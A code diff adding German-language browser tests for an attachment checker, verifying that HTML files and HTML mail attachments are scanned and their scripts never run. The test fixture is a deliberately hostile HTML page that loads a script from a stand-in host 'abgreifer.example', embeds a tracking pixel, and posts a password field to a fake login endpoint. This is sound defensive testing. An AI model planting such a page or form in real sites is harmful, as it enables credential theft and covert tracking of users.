@@ -1790,6 +1790,39 @@ if (!browser) {
   const txtAnh = await dateiPruefen("notiz.txt", "text/plain", Buffer.from("Notiz (erfunden)\nKontakt: max.muster@firma-4711.test\n"));
   ok(txtAnh.arten.includes("PERSONENBEZUG") && /Textdatei/.test(txtAnh.text),
      `eine Textdatei wird als Text geprüft (${txtAnh.arten.join(", ") || txtAnh.zahl})`);
+  /* HTML-Anhang (2026-09-30): eine Seite als Datei geht durch den HTML-Prüfer.
+     Erfunden, alle Adressen .example; das eingebettete Skript darf NICHT laufen. */
+  const HTML_BOESE = '<!DOCTYPE html>\n<html lang="de"><head><script>window.__schaden="html lief"</script>\n' +
+    '<script src="https://abgreifer.example/sammeln.js"></script></head>\n' +
+    '<body><img src="https://zaehler.example/p.gif" width="1" height="1" alt="">\n' +
+    '<form action="https://abgreifer.example/login"><input name="pw"></form></body></html>';
+  await seite.evaluate(() => { delete window.__schaden; });
+  const html = await dateiPruefen("rechnung.html", "text/html", Buffer.from(HTML_BOESE));
+  ok(html.arten.includes("FREMDE-ADRESSE") && /HTML-Seite/.test(html.text) && /abgreifer\.example/.test(html.text) && /zaehler\.example/.test(html.text),
+     `eine HTML-Datei: Skript und Zählpixel von fremden Rechnern werden gemeldet (${html.arten.join(", ") || html.zahl})`);
+  ok((await seite.evaluate(() => window.__schaden || null)) === null, "… und ihr Skript ist NICHT gelaufen");
+  const htmlOk = await dateiPruefen("einladung.html", "text/html", Buffer.from(
+    '<!DOCTYPE html>\n<html lang="de"><body><p>Wir laden Sie ein, <a href="https://verein.example/">mehr</a>.</p><img src="fest.png" alt="Fest"></body></html>'));
+  ok(htmlOk.zahl === "kein Befund" && htmlOk.arten.length === 0,
+     `eine harmlose HTML-Seite meldet nichts Falsches (${htmlOk.zahl}: ${htmlOk.arten.join(", ")})`);
+  const MITHTML = ["From: a@b.test", "Subject: Rechnung", 'Content-Type: multipart/mixed; boundary="G"', "",
+    "--G", "Content-Type: text/plain", "", "Anbei die Rechnung.", "--G",
+    'Content-Type: text/html; name="rechnung.html"', 'Content-Disposition: attachment; filename="rechnung.html"',
+    "Content-Transfer-Encoding: base64", "", Buffer.from(HTML_BOESE).toString("base64"), "--G--"].join("\n");
+  await seite.evaluate((m) => {
+    document.getElementById("ergebnis").textContent = "";
+    document.getElementById("mailQuelle").value = m;
+    document.getElementById("reiter-mail").click();
+    document.getElementById("mailKnopf").click();
+  }, MITHTML);
+  await seite.waitForFunction(() => /Anhang rechnung\.html/.test(document.getElementById("ergebnis").textContent), null, { timeout: 15000 }).catch(() => {});
+  const mailHtml = await seite.evaluate(() => ({
+    arten: [...document.querySelectorAll("#ergebnis .pr-kennung")].map((x) => x.textContent),
+    text: document.getElementById("ergebnis").textContent }));
+  ok(mailHtml.arten.includes("FREMDE-ADRESSE") && /Anhang rechnung\.html/.test(mailHtml.text) && /geöffnet: HTML-Seite/.test(mailHtml.text),
+     `ein HTML-Anhang einer Mail wird als HTML-Seite geöffnet und geprüft (${mailHtml.arten.join(", ")})`);
+  ok((await seite.evaluate(() => window.__schaden || null)) === null, "… und auch dort läuft sein Skript nicht");
+  await seite.click("#reiter-datei");
   /* Klaus 2026-09-30, Vorlage H5 im PDF-Eingang: ein JPEG mit Endung .pdf stand
      als GRÜNES „kein Befund" da. Es geht jetzt an den Datei-Weg. */
   await seite.evaluate(() => { document.getElementById("ergebnis").textContent = ""; });
